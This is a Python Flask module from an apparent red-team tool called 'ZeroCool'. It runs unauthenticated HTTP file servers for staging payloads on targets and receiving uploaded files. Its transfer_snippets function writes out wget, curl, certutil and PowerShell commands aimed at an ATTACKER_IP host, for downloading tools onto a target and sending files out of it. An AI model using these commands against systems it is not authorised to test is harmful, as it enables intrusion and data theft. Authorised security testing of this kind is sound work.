"""Managed HTTP file server for ZeroCool.

Like `python3 -m http.server`, but managed from the UI and bidirectional:

  * GET  — directory listing + file download (serve tools / payloads to a target)
  * PUT  — raw-body upload  (curl -T file http://you:port/name)
  * POST — raw-body upload  (curl --data-binary @file / PowerShell)

Multiple servers can run at once, each bound to a port + directory, with a live
transfer log. Built on the stdlib http.server (no deps); GET behaviour is
inherited from SimpleHTTPRequestHandler so listings/downloads match the tool
operators already know.
"""

from __future__ import annotations

import os
import threading
import uuid
import urllib.parse
from datetime import datetime
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

from flask import Blueprint, jsonify, render_template, request

import storage

files_bp = Blueprint("files", __name__)

SERVERS: dict[str, "FileServer"] = {}
_lock = threading.Lock()


def _now() -> str:
    return datetime.now().isoformat(timespec="seconds")


def _make_handler(fs: "FileServer"):
    directory = fs.directory

    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=directory, **kwargs)

        # Suppress the default stderr logging; we record semantic entries below.
        def log_message(self, fmt, *args):  # noqa: A003
            pass

        def do_GET(self):  # noqa: N802
            fs.add_log(self.client_address[0], "download", self.path)
            super().do_GET()

        def do_PUT(self):  # noqa: N802
            self._receive()

        def do_POST(self):  # noqa: N802
            self._receive()

        def _receive(self):
            name = os.path.basename(urllib.parse.unquote(self.path.split("?")[0])) or "upload.bin"
            dest = os.path.join(directory, name)
            try:
                length = int(self.headers.get("Content-Length", 0))
            except (TypeError, ValueError):
                length = 0
            try:
                written = 0
                with open(dest, "wb") as fh:
                    remaining = length
                    while remaining > 0:
                        chunk = self.rfile.read(min(65536, remaining))
                        if not chunk:
                            break
                        fh.write(chunk)
                        remaining -= len(chunk)
                        written += len(chunk)
                self.send_response(201)
                self.send_header("Content-Length", "3")
                self.end_headers()
                self.wfile.write(b"OK\n")
                fs.add_log(self.client_address[0], "upload", f"{name} ({written} bytes)")
            except OSError as exc:
                self.send_error(500, str(exc))
                fs.add_log(self.client_address[0], "error", f"{name}: {exc}")

    return Handler


class FileServer:
    def __init__(self, port: int, directory: str, host: str = "0.0.0.0"):
        self.id = uuid.uuid4().hex[:8]
        self.port = port
        self.directory = directory
        self.host = host
        self.created = _now()
        self.status = "serving"
        self.error: str | None = None
        self.httpd: ThreadingHTTPServer | None = None
        self.log: list[dict] = []
        self._log_lock = threading.Lock()

    def add_log(self, client: str, action: str, detail: str) -> None:
        with self._log_lock:
            self.log.append({"ts": _now(), "client": client, "action": action, "detail": detail})
            if len(self.log) > 500:
                self.log = self.log[-500:]

    def start(self) -> bool:
        if not os.path.isdir(self.directory):
            self.status = "error"
            self.error = f"not a directory: {self.directory}"
            return False
        try:
            self.httpd = ThreadingHTTPServer((self.host, self.port), _make_handler(self))
        except OSError as exc:
            self.status = "error"
            self.error = str(exc)
            return False
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        return True

    def stop(self) -> None:
        if self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except OSError:
                pass
        self.status = "stopped"


def start_server(port: int, directory: str, host: str = "0.0.0.0") -> "FileServer":
    fs = FileServer(port, directory, host)
    fs.start()
    with _lock:
        SERVERS[fs.id] = fs
    return fs


def stop_server(fid: str) -> bool:
    fs = SERVERS.get(fid)
    if not fs:
        return False
    fs.stop()
    return True


def state() -> dict:
    with _lock:
        servers = [{
            "id": fs.id, "port": fs.port, "directory": fs.directory, "host": fs.host,
            "status": fs.status, "error": fs.error, "created": fs.created,
            "transfers": len(fs.log), "log": fs.log[-60:],
        } for fs in SERVERS.values()]
    servers.sort(key=lambda s: s["created"], reverse=True)
    return {"servers": servers}


def transfer_snippets(ip: str, port, fname: str = "file") -> dict:
    ip = ip or "ATTACKER_IP"
    url = f"http://{ip}:{port}/{fname}"
    return {
        "download": [
            {"label": "wget", "cmd": f"wget {url} -O {fname}"},
            {"label": "curl", "cmd": f"curl {url} -o {fname}"},
            {"label": "PowerShell", "cmd": f"powershell -c \"Invoke-WebRequest {url} -OutFile {fname}\""},
            {"label": "certutil", "cmd": f"certutil -urlcache -split -f {url} {fname}"},
        ],
        "upload": [
            {"label": "curl PUT", "cmd": f"curl -T {fname} {url}"},
            {"label": "curl POST", "cmd": f"curl -X POST --data-binary @{fname} {url}"},
            {"label": "PowerShell", "cmd": f"powershell -c \"Invoke-RestMethod -Uri {url} -Method Put -InFile {fname}\""},
        ],
    }


# --------------------------------------------------------------------------
# routes
# --------------------------------------------------------------------------

@files_bp.route("/files")
def files():
    eng = storage.load_engagement()
    default_dir = eng.get("output_dir") or os.path.expanduser("~")
    snippets = transfer_snippets(eng.get("attacker_ip", ""), "PORT", "file")
    return render_template("files.html", eng=eng, default_dir=default_dir, snippets=snippets)


@files_bp.route("/files/serve", methods=["POST"])
def files_serve():
    payload = request.get_json(silent=True) or request.form
    try:
        port = int(payload.get("port"))
    except (TypeError, ValueError):
        return jsonify({"error": "invalid port"}), 400
    if not (1 <= port <= 65535):
        return jsonify({"error": "port out of range"}), 400
    directory = (payload.get("directory") or "").strip() or os.path.expanduser("~")
    host = (payload.get("host") or "0.0.0.0").strip() or "0.0.0.0"
    fs = start_server(port, directory, host)
    if fs.status == "error":
        return jsonify({"error": fs.error}), 502
    return jsonify({"id": fs.id, "port": port, "directory": directory})


@files_bp.route("/files/stop/<fid>", methods=["POST"])
def files_stop(fid):
    return jsonify({"stopped": stop_server(fid)})


@files_bp.route("/files/state")
def files_state():
    return jsonify(state())
